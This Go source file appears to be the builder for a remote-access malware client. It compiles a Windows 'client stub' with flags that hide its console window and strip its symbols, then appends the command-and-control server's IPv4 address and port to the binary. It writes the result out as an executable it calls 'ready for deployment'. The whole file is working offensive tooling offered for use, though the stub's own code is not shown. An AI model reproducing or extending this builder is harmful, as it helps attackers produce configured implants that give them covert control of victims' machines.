package main

import (
	"encoding/binary"
	"flag"
	"fmt"
	"net"
	"os"
	"os/exec"
	"path/filepath"
)

func main() {
	ipFlag := flag.String("ip", "127.0.0.1", "C2 server IPv4 address")
	portFlag := flag.Int("port", 4444, "C2 server port (1-65535)")
	stubFlag := flag.String("stub", "client/client.stub", "Path to client.stub base binary")
	outFlag := flag.String("out", "dist/client.exe", "Output path for the configured executable")
	buildStub := flag.Bool("build", false, "Compile client.stub automatically before patching")
	flag.Parse()

	if *portFlag <= 0 || *portFlag > 65535 {
		fmt.Fprintf(os.Stderr, "[-] Error: invalid port %d (must be between 1 and 65535)\n", *portFlag)
		os.Exit(1)
	}

	parsedIP := net.ParseIP(*ipFlag)
	if parsedIP == nil || parsedIP.To4() == nil {
		fmt.Fprintf(os.Stderr, "[-] Error: '%s' is not a valid IPv4 address\n", *ipFlag)
		os.Exit(1)
	}
	ipv4 := parsedIP.To4()

	// If requested or if stub does not exist, attempt to compile it
	stubPath := *stubFlag
	if *buildStub || (!fileExists(stubPath) && fileExists("client/main.go")) {
		fmt.Println("[*] Compiling fresh client stub for Windows amd64...")
		cmd := exec.Command("go", "build", "-ldflags", "-H=windowsgui -s -w", "-o", "client.stub", ".")
		cmd.Dir = "client"
		cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64")
		cmd.Stdout = os.Stdout
		cmd.Stderr = os.Stderr
		if err := cmd.Run(); err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to compile client stub: %v\n", err)
			os.Exit(1)
		}
		stubPath = "client/client.stub"
	}

	stubData, err := os.ReadFile(stubPath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error reading stub '%s': %v\n", stubPath, err)
		os.Exit(1)
	}

	// Trailing 6 bytes format:
	// - [0:2] uint16 LittleEndian (Port)
	// - [2:6] 4 bytes IPv4 (Host)
	trailingConfig := make([]byte, 6)
	binary.LittleEndian.PutUint16(trailingConfig[0:2], uint16(*portFlag))
	copy(trailingConfig[2:6], ipv4)

	finalBinary := append(stubData, trailingConfig...)

	// Create output directory if necessary
	outDir := filepath.Dir(*outFlag)
	if outDir != "" && outDir != "." {
		if err := os.MkdirAll(outDir, 0755); err != nil {
			fmt.Fprintf(os.Stderr, "[-] Error creating output directory '%s': %v\n", outDir, err)
			os.Exit(1)
		}
	}

	if err := os.WriteFile(*outFlag, finalBinary, 0755); err != nil {
		fmt.Fprintf(os.Stderr, "[-] Error writing executable to '%s': %v\n", *outFlag, err)
		os.Exit(1)
	}

	fmt.Printf("[+] Configured client payload generated successfully!\n")
	fmt.Printf("    Target C2 Address : %s:%d\n", *ipFlag, *portFlag)
	fmt.Printf("    Base Stub File    : %s (%d bytes)\n", stubPath, len(stubData))
	fmt.Printf("    Output Executable : %s (%d bytes)\n", *outFlag, len(finalBinary))
	fmt.Println("[+] Ready for deployment.")
}

func fileExists(path string) bool {
	info, err := os.Stat(path)
	if err != nil {
		return false
	}
	return !info.IsDir()
}
